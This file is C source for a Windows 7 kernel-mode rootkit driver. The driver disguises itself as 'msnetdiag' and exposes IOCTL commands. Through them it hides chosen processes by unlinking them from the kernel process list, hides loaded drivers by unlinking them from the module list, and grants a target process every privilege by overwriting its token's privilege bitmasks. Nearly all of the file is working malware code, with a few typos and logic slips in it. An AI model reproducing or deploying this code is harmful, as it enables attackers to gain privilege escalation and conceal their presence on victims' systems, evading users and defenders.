#include "ntddk.h"
#include "dbgmsg.h"
#include "stdio.h"
#include "stdlib.h"

const WCHAR DeviceNameBuffer[] = L"\\Device\\msnetdiag";
const WCHAR DeviceLinkBuffer[] = L"\\DosDevices\\msnetdiag";
PDRIVER_OBJECT DriverObjectRef;
PDRIVER_OBJECT MSNetDiagDeviceObject;
offset Offset;

void LowerIRQL(KIRQL prev)
{
	KeLowerIrql(prev);
	return;
}

KIRQL RaiseIRQL()
{
	KIRQL curr;
	KIRQL prev;

	curr = KeGetCurrentIrql();
	prev = curr;
	if (curr < DISPATCH_LEVEL) {
		KeRaiseIrql(DISPATCH_LEVEL, &prev);
	}
	return prev;
}

int getPID(BYTE* currentPEP)
{
	int* pid;
	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
	return *pid;
}

BYTE* getNextPEP(BYTE* currentPEP)
{
	BYTE* nextPEP = NULL;
	BYTE* fLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	fLink = (BYTE*)(listEntry.Flink);
	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
	return nextPEP;
}

void processToken(BYTE* currentPEP)
{
	UCHAR* token_address;
	UCHAR* address;
	DWORD addressWORD;

	unsigned __int64 *bigP;
	
	address = (currentPEP + EPROCESS_OFFSET_TOKEN);

	addressWORD = *((DWORD*)address);
	addressWORD = addressWORD & 0xfffffff8;
	token_address = (BYTE*)addressWORD;

	bigP = (unsigned __int64*)(token_address + TOKEN_OFFSET_PRIV);
	*bigP = 0xffffffffffffffff;
	bigP = (unsigned __int64*)(token_address + TOKEN_OFFSET_ENABLED);
	*bigP = 0xfffffffffffffff;
	bigP = (unsigned __int64)(token_address + TIKEN_OFFSET_DEFAULT);
	*bigP = 0xffffffffffffffff;
	return;
}

void ScanTaskList(DWORD pid)
{
	BYTE* currentPEP = NULL;
	BYTE* nextPEP = NULL;
	int currentPID = 0;
	int startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];

	int fuse = 0;
	const int BLOWN = 4096;

	currentPEP = (BYTE*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);

	startPID = currentPID;
	if (currentPID == pid) {
		processToken(currentPEP);
		return;
	}

	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);

	while (startPID != currentPID) {
		if (currentPID == pid) {
			processToken(currentPEP);
			return;
		}

		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		fuse++;
		if (fuse == BLOWN) { return; }
	}
	return;
}

void ModifyToken(DWORD* pid)
{
	KIRQL irql;
	PKDPC dpcPtr;

	irql = RaiseIRQL();

	ScanTaskList(*pid);

	LowerIRQL(irql);
	return;
}

void removeDriver(DRIVER_SECTION* currentDS)
{
	LIST_ENTRY* prevDS;
	LIST_ENTRY* nextDS;
	KIRQL irql;
	PKDPC dpcPtr;
	irql = RaiseIRQL();

	prevDS = ((*currentDS).listEntry).Blink;
	nextDS = ((*currentDS).listEntry).Flink;
	(*prevDS).Flink = nextDS;
	(*nextDS).Flink = prevDS;
	((*currentDS).listEntry).Flink = (LIST_ENTRY*)currentDS;
	((*currentDS).listEntry).Blink = (LIST_ENTRY*)currentDS;

	LowerIRQL(irql);
	return;
}

DRIVER_SECTION* getCurrentDriverSection()
{
	BYTE* object;
	DRIVER_SECTION* driverSection;

	object = (UCHAR*)DriverObjectRef;
	driverSection = *((PDRIVER_SECTION*)((DWORD)object + OFFSET_DRIVERSECTION));
	return driverSection;
}

void HideDriver(BYTE* driverName)
{
	ANSI_STRING aDriverName;
	UNICODE_STRING uDriverName;
	NTSTATUS retVal;
	DRIVER_SECTION* currentDS;
	DRIVER_SECTION* firstDS;
	LONG match;

	RtlInitAnsiString(&aDriverName, driverName);
	retVal = RtlAnsiStringToUnicodeString(&uDriverName, &aDriverName, TRUE);
	if (retVal != STATUS_SUCCESS) {
		DBG_PRINT2("[HideDriver]: Unable to covert to (%s)", driverName);
	}

	currentDS = getCurrentDriverSection();
	firstDS = currentDS;

	match = RtlCompareUnicodeString
	(
		&uDriverName,
		&((*currentDS).fileName),
		TRUE
	);
	if (match == 0) {
		removeDriver(currentDS);
		return;
	}

	currentDS = (DRIVER_SECTION*)((*firstDS).listEntry).Flink;

	while (((DWORD)currentDS) != ((DWORD)firstDS)) {
		match = RtlCompareUnicodeString
		(
			&uDriverName,
			&((*currentDS).fileName),
			TRUE
		);
		if (match == 0) {
			removeDriver(currentDS);
			return;
		}
		currentDS = (DRIVER_SECTION*)((*currentDS).listEntry).Flink;
	}

	RtlFreeUnicodeString(&uDriverName);
	DBG_PRINT2("[HideDriver]: Driver (%s) NOT found", driverName);
	return;
}

BOOLEAN isOSSupported()
{
	return Offset.isSupported;
}

void checkOSVersion()
{
	NTSTATUS retVal;
	RTL_OSVERSIONINFOW versionInfo;

	versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
	retVal = RtlGetVersion(&versionInfo);

	Offset.isSupported = TRUE;

	DBG_PRINT2("[checkOSVersion]:Major #=%d", versionInfo.dwMajorVersion);
	switch (versionInfo.dwMajorVersion) {
	case 4:
	{
		DBG_TRACE("checkOSVersion", "OS=NT");
		Offset.isSupported = FALSE;
	}
	break;
	case 5:
	{
		DBG_TRACE("checkOSVersion", "OS=2000, XP, Server 2003");
		Offset.isSupported = FALSE;
	}
	break;
	case 6:
	{
		DBG_TRACE("checkOSVersion", "OS=Windows 7");
		Offset.isSupported = TRUE;
		Offset.ProcPID = 0x0b4;
		Offset.ProcName = 0x16c;
		Offset.ProcLinks = 0x0b8;
		Offset.DriverSection = 0x014;
		Offset.Token = 0x0f8;
		Offset.nSIDS = 0x078;
		Offset.PrivPresent = 0x040;
		Offset.PrivEnable = 0x048;
		Offset.PrivDefaultEnable = 0x050;
		DBG_PRINT2("ProcID=%03x%", Offset.ProcPID);
		DBG_PRINT2("ProcName=%03x%", Offset.ProcName);
		DBG_PRINT2("ProcLinks=%03x%", Offset.ProcLinks);
		DBG_PRINT2("DriverSection=%03x%", Offset.DriverSection);
		DBG_PRINT2("Token=%03x%", Offset.Token);
		DBG_PRINT2("nSIDS=%03x%", Offset.nSIDS);
		DBG_PRINT2("PrivPresent=%03x%", Offset.PrivPresent);
		DBG_PRINT2("PrivEnable=%03x%", Offset.PrivEnable);
		DBG_PRINT2("PrivDefaultEnable=%03x%", Offset.PrivDefaultEnable);
	}
	break;
	default:
	{
		Offset.isSupported = FALSE;
	}
	}
	return;
}

void getTaskName(char* dest, char* src)
{
	strncpy(dest, src, SZ_EPROCESS_NAME);
	dest[SZ_EPROCESS_NAME - 1] = '\0';
	return;
}

UCHAR* getPreviousPEP(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* bLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	bLink = (BYTE*)(listEntry.Blink);
	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
	
	return prevPEP;
}

void modifyTaskListEntry(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* nextPEP = NULL;

	int currentPID = 0;
	int prevPID = 0;
	int nextPID = 0;

	LIST_ENTRY* currentListEntry;
	LIST_ENTRY* prevListEntry;
	LIST_ENTRY* nextListEntry;

	currentPID = getPID(currentPEP);

	prevPEP = getPreviousPEP(currentPEP);
	prevPID = getPID(prevPEP);

	nextPEP = getNextPEP(currentPEP);
	nextPID = getPID(nextPEP);

	currentListEntry = ((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevPEP + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextPEP + EPROCESS_OFFSET_LINKS));

	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

}

void modifyTaskList(DWORD pid)
{
	BYTE* currentPEP = NULL;
	BYTE* nextPEP = NULL;
	int currentPID = 0;
	int startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];
	int fuse = 0;
	const int BLOWN = 1048576;

	currentPEP = (UCHAR*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	startPID = currentPID;
	if (currentPID == pid) {
		modifyTaskListEntry(currentPEP);
		DBG_PRINT2("modifyTaskList:Search[DONE] PID=%d Hidden\n", pid);
		return;
	}

	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	while (startPID != currentPID) {
		if (currentPID == pid) {
			modifyTaskListEntry(currentPEP);
			DBG_PRINT2("modifyTaskList:Search[DONE] PID=%d Hidden\n", pid);
			return;
		}
		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == BLOWN)
			return;
	}

	DBG_PRINT2("    %d Tasks Listed\n", fuse);
	DBG_PRINT2("modifyTaskList: No task found with PID=%d\n", pid);
	return;
}

void HideTask(DWORD* pid)
{
	KIRQL irql;

	irql = RaiseIRQL();
	modifyTaskList(*pid);
	LowerIRQL(irql);
	return;
}

NTSTATUS RegisterDriverDeviceName
(
	IN PDRIVER_OBJECT DriverObject
)
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;

	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	ntStatus = IoCreateDevice
	(
		DriverObject,
		0,
		&unicodeString,
		FILE_DEVICE_RK,
		0,
		TRUE,
		&MSNetDiagDeviceObject
	);
	return ntStatus;
}

NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
	ntStatus = IoCreateSymbolicLink
	(
		&unicodeLinkString,
		&unicodeString
	);
	return ntStatus;
}

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING unicodeString;
	PDEVICE_OBJECT deviceObj;
	deviceObj = (*DriverObject).DeviceObject;

	DBG_TRACE("OnUnload", "Received signal to unload the driver");

	if (deviceObj != NULL) {
		DBG_TRACE("OnUnload", "Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);

		DBG_TRACE("OnUnload", "Unregistering driver's device name");
		IoDeleteDevice((*DriverObject).DeviceObject);
	}
	return;
}

NTSTATUS defaultDispatch
(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP IRP
)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	IoCompleteRequest(IRP, IO_NO_INCREMENT);

	return (STATUS_SUCCESS);
}

NTSTATUS dispatchIOControl
(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP IRP
)
{
	PIO_STACK_LOCATION irpStack;
	PVOID		inputBuffer;
	PVOID		outputBuffer;
	ULONG		inBufferLength;
	ULONG		outBufferLength;
	DWORD		ioctrlcode;
	NTSTATUS	ntStatus;

	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;

	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;

	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode=(*irpStack).Parameters.DeviceIoControl.IoControlCode;

	switch (ioctrlcode)
	{
	case IOCTL_TEST_HIDEME:
	{
		DWORD* pid;
		if (inBufferLength < sizeof(DWORD) || inputBuffer == NULL) {
			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		pid = (DWORD*)inputBuffer;
		HideTask(pid);
	}
	break;

	case IOCTL_TEST_HIDEDRIVER:
	{
		BYTE* driverName;
		if (inBufferLength < 0 || inputBuffer == NULL) {
			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		driverName = (BYTE*)inputBuffer;
		HideDriver(driverName);
	}
	break;

	case IOCTL_TEST_MODIFYTOOKEN:
	{
		DWORD* pid;
		if (inBufferLength < sizeof(DWORD) || inputBuffer == NULL) {
			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		pid = (DWORD*)inputBuffer;
		ModifyToken(pid);
	}
	break;

	}

	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
)
{
	int i;
	NTSTATUS ntStatus;

	DBG_TRACE("Drive Entry", "Driver has been loaded");

	checkOSVersion();
	if (!isOSSupported()) {
		return STATUS_OS_NOT_SUPPORT;
	}

	DBG_TRACE("Driver Entry", "Registering driver's device name");
	ntStatus = RegisterDriverDeviceName(DriverObject);
	if (!NT_SUCCESS(ntStatus)) {
		DBG_TRACE("Driver Entry", "Failed to create device");
		return ntStatus;
	}
	DBG_TRACE("Driver Entry", "Registering driver's symbolic link");
	ntStatus = RegisterDriverDeviceLink();
	if (!NT_SUCCESS(ntStatus)) {
		DBG_TRACE("Driver Entry", "Failed to create symbolic link");
		return ntStatus;
	}

	for (i = 0;i<IRP_MJ_MAXIMUM_FUNCTION;i++) {
		(*DriverObject).MajorFunction[i] = defaultDispatch;
	}
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;
	DriverObjectRef = DriverObject;
	return (STATUS_SUCCESS);
}
